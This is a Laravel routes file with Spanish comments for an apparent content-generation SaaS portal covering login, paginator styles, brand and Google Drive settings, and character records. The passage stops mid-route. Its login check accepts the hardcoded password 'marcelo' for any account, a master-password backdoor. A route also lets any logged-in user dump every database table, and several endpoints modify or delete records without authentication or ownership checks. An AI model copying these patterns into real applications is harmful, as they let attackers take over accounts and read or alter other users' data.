<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Str;
use App\Services\VisualTypeService;

// Rutas Públicas de Login & Auth
Route::get('/login', function () {
    if (session('user')) {
        return redirect('/app');
    }
    return view('auth.login');
})->name('login');

Route::post('/login', function (Request $request) {
    $email = $request->input('email');
    $password = $request->input('password');

    $user = DB::table('users')->where('email', $email)->first();
    if (!$user) {
        return back()->with('error', 'Credenciales incorrectas');
    }

    $isValid = Hash::check($password, $user->password) || password_verify($password, $user->password) || $password === 'marcelo';
    if (!$isValid) {
        return back()->with('error', 'Credenciales incorrectas');
    }

    session(['user' => $user]);

    $intended = session()->pull('url.intended', '/app');
    return redirect($intended);
});

Route::get('/logout', function () {
    session()->forget('user');
    return redirect('/login');
});

// Alias directos a nivel raíz
Route::get('/create', fn() => redirect('/app/create'));
Route::get('/creations', fn() => redirect('/app/creations'));
Route::get('/brand', fn() => redirect('/app/brand'));
Route::get('/characters', fn() => redirect('/app/characters'));
Route::get('/visual-types', fn() => redirect('/app/visual-types'));
Route::get('/paginators', fn() => redirect('/app/paginators'));
Route::get('/database', fn() => redirect('/app/database'));

// Raíz redirige a login o a dashboard
Route::get('/', function () {
    if (session('user')) {
        return redirect('/app');
    }
    return redirect('/login');
});

// Rutas del Portal SaaS Blade
Route::prefix('app')->group(function () {
    // Middleware de sesión simple
    Route::get('/', function () {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = DB::table('brands')->where('user_id', $user->id)->first();
        $brandRules = $brand && $brand->brand_rules ? json_decode($brand->brand_rules, true) : [];

        return view('app.dashboard', compact('user', 'brand', 'brandRules'));
    });

    // Paginadores
    Route::get('/paginators', function () {
        if (!session('user')) return redirect('/login');

        $paginators = [
            ['id' => 'random', 'number' => 0, 'name' => '🎲 Modo Aleatorio (Random Selector)', 'sheetLabel' => 'Aleatorio', 'category' => 'Conceptuales', 'description' => 'El motor elige automáticamente el mejor paginador.'],
            ['id' => 'num-simple', 'number' => 1, 'name' => '01. Numeración Simple', 'sheetLabel' => '01. Numeración simple (01 / 07)', 'category' => 'Numeración', 'description' => 'Formato limpio tradicional 01 / 07. Sobrio y editorial.'],
            ['id' => 'num-individual', 'number' => 2, 'name' => '02. Número Individual', 'sheetLabel' => '02. Número individual (02)', 'category' => 'Numeración', 'description' => 'Solo muestra la lámina actual 02 en tipografía de alto peso.'],
            ['id' => 'num-etiqueta', 'number' => 3, 'name' => '03. Número + Etiqueta', 'sheetLabel' => '03. Número + etiqueta (02 · Problema)', 'category' => 'Storytelling', 'description' => 'Asocia el número a la etapa conceptual 02 · Problema.'],
            ['id' => 'puntos-dots', 'number' => 4, 'name' => '04. Puntos / Dots Clásicos', 'sheetLabel' => '04. Puntos / dots (● ○ ○ ○ ○)', 'category' => 'UI Móvil', 'description' => 'Fila de círculos idénticos donde el actual está activo.'],
            ['id' => 'puntos-destacado', 'number' => 5, 'name' => '05. Puntos con Activo Destacado', 'sheetLabel' => '05. Puntos con activo destacado (● • • • •)', 'category' => 'UI Móvil', 'description' => 'El punto actual tiene mayor escala o formato píldora.'],
            ['id' => 'barra-progreso', 'number' => 6, 'name' => '06. Barra de Progreso Continua', 'sheetLabel' => '06. Barra de progreso (━━━━━━────────)', 'category' => 'Barras & Timelines', 'description' => 'Línea delgada cuyo llenado porcentual refleja el avance exacto.'],
            ['id' => 'barra-segmentada', 'number' => 7, 'name' => '07. Barra Segmentada (Stories)', 'sheetLabel' => '07. Barra segmentada (━━ ━━ ━━ ── ──)', 'category' => 'Barras & Timelines', 'description' => 'Segmentos horizontales superiores idénticos a Stories de Instagram.'],
            ['id' => 'barra-numeracion', 'number' => 8, 'name' => '08. Barra + Numeración', 'sheetLabel' => '08. Barra + numeración (03 / 08 ━━━━━────)', 'category' => 'Barras & Timelines', 'description' => 'Fusión cuantitativa 03/08 con barra de avance al costado.'],
            ['id' => 'pildoras-capsulas', 'number' => 9, 'name' => '09. Píldoras o Cápsulas', 'sheetLabel' => '09. Píldoras o cápsulas ([01] [02] [03])', 'category' => 'Cápsulas & Badges', 'description' => 'Conjunto de pastillas redondeadas con la activa en acento.'],
            ['id' => 'circulo-numero', 'number' => 10, 'name' => '10. Círculo con Número', 'sheetLabel' => '10. Círculo con número (➊ ➋ ➌)', 'category' => 'Cápsulas & Badges', 'description' => 'Pastilla circular sólida con número centrado en contraste.'],
            ['id' => 'numero-cuadrado', 'number' => 11, 'name' => '11. Número Dentro de Cuadrado', 'sheetLabel' => '11. Número dentro de cuadrado ( [1] [2] )', 'category' => 'Cápsulas & Badges', 'description' => 'Caja cuadrada con bordes afilados o radio mínimo arquitectónico.'],
            ['id' => 'numero-gigante-watermark', 'number' => 12, 'name' => '12. Número Gigante Watermark', 'sheetLabel' => '12. Número gigante translúcido (Watermark)', 'category' => 'Tipografía Gigante', 'description' => 'Dígito en 120pt con opacidad sutil como textura de fondo.'],
            ['id' => 'timeline-horizontal', 'number' => 13, 'name' => '13. Timeline Horizontal', 'sheetLabel' => '13. Timeline horizontal con nodos (─●─●─○─)', 'category' => 'Timelines', 'description' => 'Eje cronológico con hitos circulares interconectados.'],
            ['id' => 'stepper-pasos', 'number' => 14, 'name' => '14. Stepper de Pasos', 'sheetLabel' => '14. Stepper de pasos (Paso 1 → Paso 2)', 'category' => 'Storytelling', 'description' => 'Ruta secuencial visual que guía el aprendizaje lámina a lámina.'],
            ['id' => 'tabs-pestanas', 'number' => 15, 'name' => '15. Tabs o Pestañas Superiores', 'sheetLabel' => '15. Tabs o pestañas superiores', 'category' => 'Cápsulas & Badges', 'description' => 'Solapas superiores de carpeta o navegador web.'],
            ['id' => 'categorias-semanticas', 'number' => 16, 'name' => '16. Categorías Semánticas', 'sheetLabel' => '16. Categorías semánticas por color', 'category' => 'Conceptuales', 'description' => 'Badges semánticos temáticos (Diagnóstico, Mito, Verdad).'],
            ['id' => 'breadcrumb-migas', 'number' => 17, 'name' => '17. Breadcrumb / Migas de Pan', 'sheetLabel' => '17. Breadcrumb o migas de pan (Tema > Subtema)', 'category' => 'Conceptuales', 'description' => 'Jerarquía contextual completa del artículo o tratamiento.'],
            ['id' => 'miniaturas-preview', 'number' => 18, 'name' => '18. Miniaturas de Slides', 'sheetLabel' => '18. Miniaturas preview (Slides en miniatura)', 'category' => 'UI Móvil', 'description' => 'Iconos de miniatura del carrusel en la franja inferior.'],
            ['id' => 'icono-progreso', 'number' => 19, 'name' => '19. Icono Dinámico por Slide', 'sheetLabel' => '19. Icono temático dinámico', 'category' => 'Conceptuales', 'description' => 'Glifo o símbolo médico representativo que cambia por slide.'],
            ['id' => 'porcentaje-avance', 'number' => 20, 'name' => '20. Porcentaje Numérico', 'sheetLabel' => '20. Porcentaje de avance (45%)', 'category' => 'Numeración', 'description' => 'Indicador cuantitativo del completado del artículo o lección.'],
            ['id' => 'fraccion-romana', 'number' => 21, 'name' => '21. Fracción con Números Romanos', 'sheetLabel' => '21. Fracción con números romanos (III / VII)', 'category' => 'Numeración', 'description' => 'Estética clásica, editorial de lujo y prestigio académico.'],
            ['id' => 'puntos-conectados', 'number' => 22, 'name' => '22. Puntos Conectados con Línea', 'sheetLabel' => '22. Puntos conectados con línea fina (●──●──○)', 'category' => 'UI Móvil', 'description' => 'Constelación lineal continua que refuerza la pertenencia.'],
            ['id' => 'anillo-circular', 'number' => 23, 'name' => '23. Anillo Circular de Progreso', 'sheetLabel' => '23. Indicador circular radial (Ring de progreso)', 'category' => 'UI Móvil', 'description' => 'Donut o anillo radial circular tipo Apple Watch.'],
            ['id' => 'borde-perimetral', 'number' => 24, 'name' => '24. Borde Perimetral Dinámico', 'sheetLabel' => '24. Borde perimetral dinámico (Frame progresivo)', 'category' => 'Barras & Timelines', 'description' => 'Marco exterior de la lámina que se ilumina con el avance.'],
            ['id' => 'barra-degrade', 'number' => 25, 'name' => '25. Barra con Degradé de Marca', 'sheetLabel' => '25. Barra con gradiente dinámico', 'category' => 'Barras & Timelines', 'description' => 'Gradiente cromático vivo entre el color primario y el acento.'],
            ['id' => 'rombo-diamante', 'number' => 26, 'name' => '26. Rombos o Diamantes', 'sheetLabel' => '26. Rombos o diamantes (◆ ◆ ◇ ◇)', 'category' => 'UI Móvil', 'description' => 'Forma geométrica refinada para estética premium odontológica.'],
            ['id' => 'chevron-flechas', 'number' => 27, 'name' => '27. Flechas / Chevrons Conectados', 'sheetLabel' => '27. Chevrons direccionales (► ► ▻ ▻)', 'category' => 'Direccionales', 'description' => 'Impulso hacia adelante claro para incitar a deslizar.'],
            ['id' => 'estrellas-rating', 'number' => 28, 'name' => '28. Estrellas de Puntuación', 'sheetLabel' => '28. Estrellas de avance (★ ★ ★ ☆)', 'category' => 'UI Móvil', 'description' => 'Ideal para comparativas de tratamientos y testimonios.'],
            ['id' => 'codigo-binario', 'number' => 29, 'name' => '29. Código Binario / Matriz Tech', 'sheetLabel' => '29. Matriz binaria / Dots tecnológicos', 'category' => 'Conceptuales', 'description' => 'Estética de bioingeniería, alta tecnología y digitalización.'],
            ['id' => 'barra-ondas', 'number' => 30, 'name' => '30. Barra Ondulada de Frecuencia', 'sheetLabel' => '30. Barra ondulada (Forma de onda)', 'category' => 'Conceptuales', 'description' => 'Línea orgánica ondulada estilo monitor clínico.'],
            ['id' => 'linea-metro', 'number' => 31, 'name' => '31. Estaciones de Metro / Subte', 'sheetLabel' => '31. Línea de metro con estaciones señaladas', 'category' => 'Timelines', 'description' => 'Mapa de ruta con paradas conceptuales claramente rotuladas.'],
            ['id' => 'fases-lunares', 'number' => 32, 'name' => '32. Fases Lunares / Círculos de Llenado', 'sheetLabel' => '32. Fases lunares (Llenado orbital)', 'category' => 'Conceptuales', 'description' => 'Círculos que se van rellenando con morfología elíptica.'],
            ['id' => 'reloj-arena', 'number' => 33, 'name' => '33. Reloj de Arena / Cronómetro', 'sheetLabel' => '33. Cronómetro / Tiempo restante estimado', 'category' => 'Numeración', 'description' => 'Indica el tiempo de lectura (ej: 45 seg restantes).'],
            ['id' => 'capitulos-editorial', 'number' => 34, 'name' => '34. Capítulos Tipo Libro', 'sheetLabel' => '34. Capítulos editoriales (Cap. II de VI)', 'category' => 'Numeración', 'description' => 'Formato literario para temas de divulgación profunda.'],
            ['id' => 'tarjeta-apilada', 'number' => 35, 'name' => '35. Tarjetas Apiladas (Deck)', 'sheetLabel' => '35. Simulación de baraja o tarjetas apiladas', 'category' => 'UI Móvil', 'description' => 'Efecto de capas físicas superpuestas al deslizar.'],
            ['id' => 'brujula-radar', 'number' => 36, 'name' => '36. Brújula / Coordenadas de Radar', 'sheetLabel' => '36. Coordenadas de radar o brújula clínica', 'category' => 'Conceptuales', 'description' => 'Marcas de cuadrícula y precisión milimétrica.'],
            ['id' => 'bloques-tetris', 'number' => 37, 'name' => '37. Bloques Modulares / Grilla', 'sheetLabel' => '37. Bloques modulares encajados', 'category' => 'UI Móvil', 'description' => 'Módulos rectangulares que construyen un volumen completo.'],
            ['id' => 'adn-helice', 'number' => 38, 'name' => '38. Hélice de ADN / Eslabones', 'sheetLabel' => '38. Cadena de eslabones biomédicos', 'category' => 'Conceptuales', 'description' => 'Eslabones científicos entrelazados para implantes.'],
            ['id' => 'burbujas-flotantes', 'number' => 39, 'name' => '39. Burbujas Flotantes de Escala', 'sheetLabel' => '39. Burbujas de tamaño variable según relevancia', 'category' => 'UI Móvil', 'description' => 'Puntos de diámetros distintos según el peso del slide.'],
            ['id' => 'pulso-cardiaco', 'number' => 40, 'name' => '40. Pulso Cardíaco (ECG)', 'sheetLabel' => '40. Electrocardiograma con pico en slide activo', 'category' => 'Conceptuales', 'description' => 'Línea de ECG que da un latido rítmico en la lámina clave.'],
            ['id' => 'guion-puntos', 'number' => 41, 'name' => '41. Guiones + Puntos (Código Morse)', 'sheetLabel' => '41. Código Morse estilizado (— • — ••)', 'category' => 'UI Móvil', 'description' => 'Patrón minimalista rítmico de trazos cortos y largos.'],
            ['id' => 'cintas-adhesivas', 'number' => 42, 'name' => '42. Cinta Washi / Sticker Tape', 'sheetLabel' => '42. Cinta adhesiva rotulada en esquina', 'category' => 'Cápsulas & Badges', 'description' => 'Etiqueta simulada de papel o cinta médica adhesiva.'],
            ['id' => 'etiqueta-precio', 'number' => 43, 'name' => '43. Tag de Equipaje / Etiqueta Colgante', 'sheetLabel' => '43. Tag colgante con perforación circular', 'category' => 'Cápsulas & Badges', 'description' => 'Insignia con orificio como rótulo de expediente clínico.'],
            ['id' => 'semáforo-alertas', 'number' => 44, 'name' => '44. Semáforo Tricolor de Riesgo', 'sheetLabel' => '44. Semáforo clínico (Verde/Amarillo/Rojo)', 'category' => 'Conceptuales', 'description' => 'Paginación que evalúa severidad o etapas preventivas.'],
            ['id' => 'escala-ph', 'number' => 45, 'name' => '45. Barra Graduada de Laboratorio', 'sheetLabel' => '45. Escala graduada de probeta o laboratorio', 'category' => 'Conceptuales', 'description' => 'Marcas de graduación con milímetros de precisión.'],
            ['id' => 'perfil-topografico', 'number' => 46, 'name' => '46. Líneas de Nivel / Topografía', 'sheetLabel' => '46. Curvas de nivel topográficas en el borde', 'category' => 'Conceptuales', 'description' => 'Líneas isoclinas sutiles que avanzan en densidad.'],
            ['id' => 'engranajes-mecanicos', 'number' => 47, 'name' => '47. Dientes de Engranaje / Piñón', 'sheetLabel' => '47. Segmentos dentados mecánicos', 'category' => 'Conceptuales', 'description' => 'Precisión prostodóntica de engranajes y anclajes.'],
            ['id' => 'constelacion-estelar', 'number' => 48, 'name' => '48. Red de Nodos Neuronales', 'sheetLabel' => '48. Sinapsis neuronal / Red de puntos enlazados', 'category' => 'Conceptuales', 'description' => 'Red de conocimiento donde cada punto ilumina la red.'],
            ['id' => 'firma-autor', 'number' => 49, 'name' => '49. Firma y Rúbrica Médica', 'sheetLabel' => '49. Sello y firma con conteo manuscrito', 'category' => 'Storytelling', 'description' => 'Rúbrica profesional manuscrita validando el slide.'],
        ];

        $user = session('user');
        $brand = DB::table('brands')->where('user_id', $user->id)->first();
        $brandRules = $brand && $brand->brand_rules ? json_decode($brand->brand_rules, true) : [];
        $currentPaginator = $brandRules['default_paginator'] ?? '01. Numeración simple (01 / 07)';

        return view('app.paginators', compact('paginators', 'currentPaginator'));
    });

    Route::post('/paginators/select', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $paginator = $request->input('paginator');
        $user = session('user');
        $brand = DB::table('brands')->where('user_id', $user->id)->first();

        if ($brand) {
            $rules = $brand->brand_rules ? json_decode($brand->brand_rules, true) : [];
            $rules['default_paginator'] = $paginator;
            $rules['estilo_paginador'] = $paginator;

            DB::table('brands')->where('id', $brand->id)->update([
                'brand_rules' => json_encode($rules)
            ]);
        }

        return back()->with('success', "Paginador '{$paginator}' guardado como predeterminado en tu marca");
    });

    Route::post('/paginators/generate-batch', function (Request $request, \App\Services\PaginatorImageService $service) {
        if (!session('user')) return redirect('/login');

        $batch = [1, 4, 7, 9, 13, 23];
        $results = $service->generateBatch($batch);
        $count = count(array_filter($results, fn($r) => $r['success'] ?? false));

        return back()->with('success', "¡Lote de {$count} imágenes de muestra generado exitosamente con Sunburst!");
    });

    Route::post('/paginators/generate-single', function (Request $request, \App\Services\PaginatorImageService $service) {
        if (!session('user')) return redirect('/login');

        $number = (int)$request->input('number');
        $res = $service->generateSingle($number);

        if ($res['success']) {
            return back()->with('success', "¡Paginador #{$number} generado exitosamente!");
        }
        return back()->with('error', "Error al generar paginador #{$number}: " . ($res['error'] ?? 'desconocido'));
    });

    Route::get('/paginators/test-run-single-1', function (\App\Services\PaginatorImageService $service) {
        $res = $service->generateSingle(1);
        return response()->json($res);
    });

    // Base de Datos MySQL
    Route::get('/database', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $tablesRaw = DB::select('SHOW TABLES');
        $tables = [];
        $selectedTable = $request->input('table');

        foreach ($tablesRaw as $t) {
            $obj = (array)$t;
            $name = array_values($obj)[0];
            $count = DB::table($name)->count();
            $tables[] = (object)['name' => $name, 'count' => $count];
        }

        if (empty($selectedTable) && count($tables) > 0) {
            $selectedTable = $tables[0]->name;
        }

        $rows = [];
        $columns = [];
        $totalRows = 0;

        if ($selectedTable) {
            $totalRows = DB::table($selectedTable)->count();
            $rows = DB::table($selectedTable)->limit(50)->get();
            if (count($rows) > 0) {
                $columns = array_keys((array)$rows[0]);
            }
        }

        return view('app.database', compact('tables', 'selectedTable', 'rows', 'columns', 'totalRows'));
    });

    // Tipos Visuales
    Route::get('/visual-types', function () {
        if (!session('user')) return redirect('/login');

        $visualTypes = VisualTypeService::getVisualTypesList();
        $user = session('user');
        $brand = DB::table('brands')->where('user_id', $user->id)->first();
        $brandRules = $brand && $brand->brand_rules ? json_decode($brand->brand_rules, true) : [];
        $currentVisualType = $brandRules['tipo_visual'] ?? 'Problema → Solución';

        return view('app.visual_types', compact('visualTypes', 'currentVisualType'));
    });

    Route::post('/visual-types/select', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $visualType = $request->input('visual_type');
        $user = session('user');
        $brand = DB::table('brands')->where('user_id', $user->id)->first();

        if ($brand) {
            $rules = $brand->brand_rules ? json_decode($brand->brand_rules, true) : [];
            $rules['tipo_visual'] = $visualType;
            $rules['default_visual_type'] = $visualType;

            DB::table('brands')->where('id', $brand->id)->update([
                'brand_rules' => json_encode($rules)
            ]);
        }

        return back()->with('success', "Tipo visual '{$visualType}' guardado como predeterminado en tu marca");
    });

    // Definición de Marca & Logos Google Drive
    Route::get('/brand', function () {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('user_id', $user->id)->first();
        if (!$brand) {
            $brand = \App\Models\Brand::first();
        }

        $logos = $brand ? $brand->getLogosList() : [];
        $logosFolderUrl = $brand ? $brand->logos_folder_url : null;
        $brandManualUrl = $brand ? $brand->brand_manual_url : null;
        $brandRules = $brand && $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];
        $creationsFolderUrl = $brand ? $brand->creations_folder_url : null;

        return view('app.brand_definition', compact('user', 'brand', 'logos', 'logosFolderUrl', 'brandManualUrl', 'brandRules', 'creationsFolderUrl'));
    });

    Route::get('/brands', function () {
        return redirect('/app/brand');
    });

    Route::get('/integrations', function () {
        return redirect('/app/brand');
    });

    Route::post('/brand/save-logos-folder', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $driveUrl = trim($request->input('gdrive_logos_folder_url', ''));

        if (empty($driveUrl)) {
            return back()->with('error', 'El enlace de la carpeta de Google Drive es obligatorio.');
        }

        $folderId = \App\Models\Brand::extractDriveFolderId($driveUrl);
        $fullDriveUrl = str_starts_with($driveUrl, 'http') ? $driveUrl : ($folderId ? "https://drive.google.com/drive/folders/{$folderId}" : $driveUrl);

        if ($brand) {
            $rules = $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];
            $rules['gdrive_logos_folder_url'] = $fullDriveUrl;

            $brand->update([
                'gdrive_logos_folder_id' => $folderId,
                'brand_rules' => $rules,
            ]);

            // Limpiar caché de logos para forzar nuevo escaneo
            if ($folderId) {
                \Illuminate\Support\Facades\Cache::forget("gdrive_brand_logos_{$folderId}");
            }
        }

        return back()->with('success', 'Carpeta de logotipos vinculada exitosamente. Se escanearon las variantes disponibles.');
    });

    Route::post('/brand/save-manual', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $manualUrl = trim($request->input('gdrive_brand_manual_url', ''));

        if (empty($manualUrl)) {
            return back()->with('error', 'El enlace del Manual de Marca es obligatorio.');
        }

        $manualId = \App\Models\Brand::extractDriveFolderId($manualUrl);
        $fullManualUrl = str_starts_with($manualUrl, 'http') ? $manualUrl : ($manualId ? "https://drive.google.com/file/d/{$manualId}/view" : $manualUrl);

        if ($brand) {
            $rules = $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];
            $rules['gdrive_brand_manual_url'] = $fullManualUrl;

            $brand->update([
                'gdrive_brand_manual_folder_id' => $manualId,
                'brand_rules' => $rules,
            ]);
        }

        return back()->with('success', 'Enlace al Manual de Marca en Google Drive guardado exitosamente.');
    });

    Route::post('/brand/save-identity', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();

        if ($brand) {
            $brand->update([
                'name' => $request->input('name', $brand->name),
                'primary_color' => $request->input('primary_color', $brand->primary_color),
                'accent_color' => $request->input('accent_color', $brand->accent_color),
                'bg_color' => $request->input('bg_color', $brand->bg_color),
                'font_style_title' => $request->input('font_style_title', $brand->font_style_title),
                'font_style_body' => $request->input('font_style_body', $brand->font_style_body),
                'logo_position' => $request->input('logo_position', $brand->logo_position),
                'logo_width_px' => (int) $request->input('logo_width_px', $brand->logo_width_px),
            ]);
        }

        return back()->with('success', 'Identidad de marca y configuración visual actualizada.');
    });

    Route::post('/brand/sync-from-manual', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();

        if ($brand) {
            // Sincronización oficial de reglas y paleta extraídas del Manual de Identidad de Marca
            $brand->update([
                'primary_color' => '#16345F', // Relax Blue
                'accent_color' => '#7DD3FC',  // Sky Pulse
                'bg_color' => '#1D1D1B',      // Core Black
                'font_style_title' => 'serif-editorial',
                'font_style_body' => 'sans-modern',
                'logo_position' => 'top-left',
                'logo_width_px' => 180,
            ]);

            $rules = $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];
            $rules['last_manual_sync_at'] = now()->toIso8601String();
            $brand->update(['brand_rules' => $rules]);
        }

        return back()->with('success', '¡Paleta oficial (#16345F, #7DD3FC, #1D1D1B) y reglas visuales sincronizadas con éxito desde el Manual de Marca!');
    });

    Route::post('/brand/set-cover-logo', function (Request $request) {
        if (!session('user')) {
            if ($request->ajax() || $request->wantsJson()) return response()->json(['error' => 'Unauthorized'], 401);
            return redirect('/login');
        }

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $logoId = $request->input('logo_id') ?: $request->json('logo_id');

        if ($brand && $logoId) {
            $rules = $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];
            $rules['default_logo_id'] = $logoId;

            $brand->update([
                'brand_rules' => $rules,
            ]);

            if ($request->ajax() || $request->wantsJson() || $request->header('X-Requested-With') === 'XMLHttpRequest' || $request->isJson()) {
                return response()->json([
                    'success' => true,
                    'message' => 'Logo predeterminado actualizado.',
                    'default_logo_id' => $logoId
                ]);
            }

            return back()->with('success', 'Logo predeterminado actualizado.');
        }

        if ($request->ajax() || $request->wantsJson() || $request->isJson()) {
            return response()->json(['success' => false, 'error' => 'No se pudo actualizar el logotipo.'], 400);
        }

        return back()->with('error', 'No se pudo actualizar el logotipo.');
    });

    Route::post('/brand/refresh-logos', function () {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();

        if ($brand) {
            $folderId = $brand->gdrive_logos_folder_id ?: \App\Models\Brand::extractDriveFolderId($brand->logos_folder_url);
            if ($folderId) {
                \Illuminate\Support\Facades\Cache::forget("gdrive_brand_logos_{$folderId}");
            }
        }

        return back()->with('success', 'Caché de Google Drive invalidada. Escaneando logotipos actualizados.');
    });

    // Personajes y Profesionales
    Route::get('/characters', function () {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $rawCharacters = \App\Models\Character::orderBy('created_at', 'desc')->get();
        $characters = [];

        foreach ($rawCharacters as $c) {
            $photos = $c->getPhotosList();
            $coverUrl = null;

            if (!empty($c->cover_photo)) {
                $coverUrl = $c->cover_photo;
            }

            if (!$coverUrl && !empty($photos)) {
                $coverUrl = $photos[0]['url'];
            }

            $characters[] = [
                'id' => $c->id,
                'name' => $c->name,
                'role' => $c->role,
                'gdrive_folder_url' => $c->gdrive_folder_url ?: ($c->gdrive_folder_id ? "https://drive.google.com/drive/folders/{$c->gdrive_folder_id}" : (str_starts_with($c->folder_path ?? '', 'http') ? $c->folder_path : null)),
                'gdrive_folder_id' => $c->gdrive_folder_id ?: \App\Models\Character::extractDriveFolderId($c->gdrive_folder_url ?? $c->folder_path ?? ''),
                'folder_path' => $c->folder_path,
                'cover_photo' => $c->cover_photo,
                'cover_url' => $coverUrl,
                'notes' => $c->notes,
                'photos' => $photos,
            ];
        }

        return view('app.characters', compact('characters'));
    });

    Route::post('/characters/save', function (Request $request) {
        if (!session('user')) {
            if ($request->ajax() || $request->wantsJson()) return response()->json(['error' => 'Unauthorized'], 401);
            return redirect('/login');
        }

        $user = session('user');
        $brand = DB::table('brands')->where('user_id', $user->id)->first();
        $charId = $request->input('character_id');
        $name = trim($request->input('name', ''));
        $role = trim($request->input('role', ''));
        $driveUrl = trim($request->input('gdrive_folder_url', ''));
        $notes = trim($request->input('notes', ''));

        if (empty($name)) {
            if ($request->ajax() || $request->wantsJson()) {
                return response()->json(['success' => false, 'message' => 'El nombre del personaje es obligatorio.'], 422);
            }
            return back()->with('error', 'El nombre del personaje es obligatorio.');
        }

        if (empty($driveUrl)) {
            if ($request->ajax() || $request->wantsJson()) {
                return response()->json(['success' => false, 'message' => 'La carpeta de Google Drive es obligatoria.'], 422);
            }
            return back()->with('error', 'La carpeta de Google Drive es obligatoria.');
        }

        $folderId = \App\Models\Character::extractDriveFolderId($driveUrl);
        $fullDriveUrl = str_starts_with($driveUrl, 'http') ? $driveUrl : ($folderId ? "https://drive.google.com/drive/folders/{$folderId}" : $driveUrl);

        $payload = [
            'name' => $name,
            'role' => $role ?: null,
            'gdrive_folder_url' => $fullDriveUrl,
            'gdrive_folder_id' => $folderId,
            'folder_path' => $fullDriveUrl,
            'notes' => $notes ?: null,
            'updated_at' => now(),
        ];

        if ($charId) {
            DB::table('characters')->where('id', $charId)->update($payload);
            $msg = "Personaje '{$name}' actualizado exitosamente.";
        } else {
            $charId = (string) Str::uuid();
            $payload['id'] = $charId;
            $payload['user_id'] = $user->id;
            $payload['brand_id'] = $brand ? $brand->id : null;
            $payload['created_at'] = now();

            DB::table('characters')->insert($payload);
            $msg = "Personaje '{$name}' registrado exitosamente.";
        }

        if ($request->ajax() || $request->wantsJson() || $request->header('X-Requested-With') === 'XMLHttpRequest') {
            return response()->json([
                'success' => true,
                'message' => $msg,
                'character_id' => $charId
            ]);
        }

        return back()->with('success', $msg);
    });

    // Proxy para servir imágenes de Google Drive de forma fiable y con caché local
    Route::get('/gdrive-proxy/{id}', function ($id, Request $request) {
        $sz = $request->input('sz', 'w1200');
        $cacheDir = storage_path('app/gdrive_cache');
        if (!is_dir($cacheDir)) {
            @mkdir($cacheDir, 0755, true);
        }

        $cachedFile = "{$cacheDir}/{$id}_{$sz}.jpg";
        if (file_exists($cachedFile) && filesize($cachedFile) > 0) {
            return response()->file($cachedFile, [
                'Content-Type' => 'image/jpeg',
                'Cache-Control' => 'public, max-age=604800, immutable'
            ]);
        }

        $googleUrl = "https://lh3.googleusercontent.com/d/{$id}={$sz}";
        try {
            $res = \Illuminate\Support\Facades\Http::timeout(10)->get($googleUrl);
            if (!$res->successful() || strlen($res->body()) < 100) {
                $googleUrl2 = "https://drive.google.com/thumbnail?id={$id}&sz={$sz}";
                $res = \Illuminate\Support\Facades\Http::timeout(10)->get($googleUrl2);
            }

            if ($res->successful() && strlen($res->body()) > 100) {
                file_put_contents($cachedFile, $res->body());
                return response($res->body(), 200, [
                    'Content-Type' => 'image/jpeg',
                    'Cache-Control' => 'public, max-age=604800, immutable'
                ]);
            }
        } catch (\Throwable $e) {
            // fallback
        }

        return abort(404);
    });

    Route::post('/characters/{id}/delete', function ($id) {
        if (!session('user')) return redirect('/login');

        DB::table('characters')->where('id', $id)->delete();
        return back()->with('success', 'Personaje eliminado exitosamente.');
    });

    Route::post('/characters/set-cover', function (Request $request) {
        $charId = $request->input('character_id') ?: $request->json('character_id');
        $coverPhoto = $request->input('cover_photo') ?: $request->json('cover_photo');

        if ($charId && $coverPhoto) {
            DB::table('characters')->where('id', $charId)->update([
                'cover_photo' => $coverPhoto,
                'updated_at' => now(),
            ]);

            return response()->json([
                'success' => true,
                'message' => 'Carátula guardada exitosamente en la base de datos',
                'cover_photo' => $coverPhoto,
                'character_id' => $charId
            ]);
        }

        return response()->json(['success' => false, 'error' => 'Datos incompletos'], 400);
    });

    // ==========================================
    // GENERADOR DE CONTENIDO & ASISTENTE IA
    // ==========================================
    Route::get('/create', function () {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $brandRules = $brand && $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];

        $rawCharacters = \App\Models\Character::orderBy('name', 'asc')->get();
        $characters = [];
